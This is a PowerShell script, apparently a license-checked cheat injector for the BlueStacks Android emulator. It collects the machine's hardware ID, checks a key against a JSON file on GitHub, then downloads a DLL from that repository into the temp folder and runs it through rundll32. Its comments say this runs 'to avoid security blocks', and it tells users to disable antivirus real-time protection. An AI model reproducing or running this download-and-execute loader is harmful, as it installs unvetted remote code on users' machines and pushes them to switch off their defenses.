# --- ORIGINAL INJECTOR METHOD (STABLE) ---
$UserKey = Read-Host "Please Enter License Key"
$MyHWID = (Get-WmiObject Win32_ComputerSystemProduct).UUID

# Fetch keys from GitHub without cache
$KeyUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/Power-Shell-Project/refs/heads/main/keys.json?nocache=" + (Get-Random)
try {
    $WC = New-Object System.Net.WebClient
    $Keys = $WC.DownloadString($KeyUrl) | ConvertFrom-Json
} catch {
    Write-Host "Connection Error!" -ForegroundColor Red; pause; exit
}

$CleanKey = $UserKey.Trim()

if ($Keys.$CleanKey -eq $MyHWID -or $Keys.$CleanKey -eq "") {
    Write-Host "Successfully Validated!" -ForegroundColor Green
    $DllPath = "$env:TEMP\gralloc.blue.dll"
    
    try {
        # Download fresh DLL
        Stop-Process -Name "rundll32" -ErrorAction SilentlyContinue
        $WC.DownloadFile("https://raw.githubusercontent.com/relaxhaha56-maker/Power-Shell-Project/refs/heads/main/gralloc.blue.dll", $DllPath)
        [console]::beep(600,200)

        Write-Host "System Ready! Do not close this window." -ForegroundColor Green
        Write-Host "PS C:\Windows\system32> Press F8 to start the process..." -ForegroundColor White
        
        while($true) {
            if ([console]::KeyAvailable) {
                $key = [console]::ReadKey($true)
                if ($key.Key -eq 'F8') {
                    Write-Host "F8 pressed! Targeting HD-Player..." -ForegroundColor White
                    
                    if (Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue) {
                        # --- THE ORIGINAL METHOD ---
                        # Execute DLL using the most basic system command to avoid security blocks
                        cmd /c "start /b rundll32.exe `"$DllPath`",#1"
                        
                        Write-Host "114" -ForegroundColor White
                        Write-Host "96" -ForegroundColor White
                        [console]::beep(800,300)
                    } else {
                        Write-Host "Error: HD-Player (BlueStacks) is NOT RUNNING!" -ForegroundColor Red
                    }
                }
            }
            Start-Sleep -Milliseconds 100
        }
    } catch {
        Write-Host "Injection Error! Please DISABLE Antivirus Real-time protection." -ForegroundColor Red
    }
} else {
    Write-Host "Invalid Key! HWID: $MyHWID" -ForegroundColor Red; Pause
}
